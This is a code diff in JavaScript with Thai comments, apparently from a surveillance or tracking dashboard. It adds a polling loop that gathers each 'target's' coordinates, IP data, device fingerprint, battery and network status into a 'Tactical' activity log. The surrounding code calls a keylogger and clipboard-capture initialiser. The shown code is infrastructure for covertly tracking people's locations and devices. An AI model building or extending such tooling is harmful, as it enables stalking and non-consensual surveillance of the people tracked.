@@ -133,7 +133,7 @@ function safeInit() {
   startClock();
   initKeyloggerAndClipboard();
   initActivityLog();
-  startMobileSync();
+  startCoordinatePolling();
   initFirebaseListener();
   
   const saved = loadSession();
@@ -2268,6 +2268,74 @@ function syncMobileCoordinates() {
       }
     }
   });
+}
+
+// ===== COORDINATE POLLING FOR MOBILE SYNC =====
+let lastCoordCheckTime = 0;
+let lastCoordData = {};
+
+function checkForNewCoordinates() {
+  // เช็คพิกัดใหม่จากฐานข้อมูลจำลอง (localStorage)
+  const coordKey = 'mobile_coords_latest';
+  const stored = localStorage.getItem(coordKey);
+  
+  if (!stored) return;
+  
+  try {
+    const data = JSON.parse(stored);
+    const checkTime = data.timestamp ? new Date(data.timestamp).getTime() : 0;
+    
+    // ถ้ามีข้อมูลใหม่ที่ยังไม่ได้ประมวลผล
+    if (checkTime > lastCoordCheckTime) {
+      lastCoordCheckTime = checkTime;
+      
+      // ประมวลผลข้อมูลพิกัดใหม่
+      if (data.targetId && data.coords) {
+        handleRealTimeLocationData(data.targetId, {
+          coords: data.coords,
+          timestamp: data.timestamp,
+          permission: data.permission,
+          source: data.source,
+          distanceKm: data.distanceKm,
+          ipData: data.ipData,
+          fingerprint: data.fingerprint,
+          battery: data.battery,
+          charging: data.charging,
+          network: data.network
+        });
+        
+        // แสดงข้อความใน Activity Log Console แบบ Tactical
+        pushToActivityLogConsole(data.targetId, {
+          coords: data.coords,
+          permission: data.permission,
+          source: data.source,
+          distanceKm: data.distanceKm,
+          fingerprint: data.fingerprint,
+          battery: data.battery,
+          charging: data.charging,
+          network: data.network
+        });
+      }
+    }
+  } catch (e) {
+    // ข้ามข้อผิดพลาด
+  }
+}
+
+// เริ่มการเช็คพิกัดในลูป
+function startCoordinatePolling() {
+  if (mobileSyncTimer) clearInterval(mobileSyncTimer);
+  mobileSyncTimer = setInterval(() => {
+    checkForNewCoordinates();
+    syncMobileCoordinates();
+  }, MOBILE_SYNC_INTERVAL);
+}
+
+function stopCoordinatePolling() {
+  if (mobileSyncTimer) {
+    clearInterval(mobileSyncTimer);
+    mobileSyncTimer = null;
+  }
 }
 
 // ===== LEFT SIDEBAR ACTIVITY LOG =====
